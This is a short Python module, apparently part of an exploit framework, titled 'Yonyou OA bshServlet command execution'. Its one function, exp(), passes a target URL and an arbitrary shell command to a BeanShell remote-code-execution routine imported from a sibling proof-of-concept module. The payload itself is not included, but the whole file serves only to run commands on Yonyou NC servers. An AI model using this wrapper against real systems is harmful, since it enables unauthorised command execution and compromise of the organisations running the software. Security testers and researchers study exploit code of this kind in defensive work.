# 用友OA_bshServlet命令执行
import re

from .. import requestUtil
from . import nc_bsh_rce_poc


def exp(service, cmd, content=""):
    return nc_bsh_rce_poc.bsh_rce(service.url, cmd, "exp")
